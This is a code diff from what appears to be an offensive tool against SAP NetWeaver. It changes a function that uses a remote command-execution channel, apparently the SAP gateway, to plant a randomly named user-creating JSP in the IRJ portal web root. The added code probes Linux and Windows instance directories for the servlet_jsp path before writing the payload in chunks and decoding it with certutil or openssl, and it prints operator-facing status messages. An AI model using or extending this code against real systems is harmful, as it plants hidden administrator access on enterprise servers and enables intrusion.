@@ -689,8 +689,70 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     jsp_name = _random_jsp_name("ume")
     linux = _is_linux_target(node)
     os_label = "linux" if linux else "windows"
-    target_path = (_java_root_path(sid, java_instance_nr, os_label)
-                   + ("/" if linux else "\\") + jsp_name)
+
+    # Java instance folder naming varies across NW releases:
+    #   * J<NN>   — pure Java central instance (default)
+    #   * JC<NN>  — Java Central with SCS (7.4x pattern)
+    #   * JD<NN>  — Java dialog on some NW 7.5x installs
+    #   * SMDA<NN>, ERS<NN> — SCS / enqueue replication (never IRJ)
+    # The hard-coded J<NN> in _java_root_path fails on hosts using
+    # JC<NN>.  Probe candidates via `dir /b` (Win) / `ls` (Unix)
+    # before we spend 15-20 s writing 144 chunks — if we can't find
+    # a servlet_jsp/irj/root directory on ANY candidate, bail early
+    # with a clear error rather than dying at the certutil decode
+    # step (operator-reported: JAV/J02 on Windows returned
+    # PATH_NOT_FOUND from certutil).
+    def _probe_java_root(nr):
+        inst_candidates = [
+            f"J{int(nr):02d}",
+            f"JC{int(nr):02d}",
+            f"JD{int(nr):02d}",
+        ]
+        if linux:
+            base = f"/usr/sap/{sid}"
+            for inst in inst_candidates:
+                root = (f"{base}/{inst}/j2ee/cluster/apps/sap.com/"
+                        f"irj/servlet_jsp/irj/root")
+                r = exec_fn("/usr/bin/test", f"-d {root}")
+                if r.get("success") and r.get("exit_code", 0) == 0:
+                    return root
+            return None
+        base = fr"C:\usr\sap\{sid}"
+        for inst in inst_candidates:
+            root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
+                    fr"\servlet_jsp\irj\root")
+            # cmd.exe if exist "<path>\." echo YES  — no exit
+            # code contract on missing paths, so grep the output.
+            r = exec_fn("cmd.exe",
+                         f'/C if exist "{root}\\." (echo YES) '
+                         f'else (echo NO)')
+            out = " ".join(
+                str(l) for l in (r.get("output") or [])
+            ).strip().upper()
+            if "YES" in out:
+                return root
+        return None
+
+    probed_root = _probe_java_root(java_instance_nr)
+    if probed_root:
+        target_path = probed_root + (("/" if linux else "\\")
+                                       + jsp_name)
+        print(f"[+] {node.sid}: probed Java root — using "
+              f"{probed_root}")
+    else:
+        # Fall back to the canonical path even if we couldn't probe
+        # (e.g. exec_fn returned nothing useful).  If it's wrong,
+        # certutil/openssl will still fail at decode with a clear
+        # PATH_NOT_FOUND we can surface.
+        target_path = (_java_root_path(sid, java_instance_nr,
+                                          os_label)
+                       + ("/" if linux else "\\") + jsp_name)
+        print(f"[!] {node.sid}: could not confirm servlet_jsp/irj/"
+              f"root on any candidate instance dir "
+              f"(J{java_instance_nr:02d}, "
+              f"JC{java_instance_nr:02d}, "
+              f"JD{java_instance_nr:02d}) — falling back to "
+              f"{_java_root_path(sid, java_instance_nr, os_label)}")
 
     import random as _r
     import string as _s
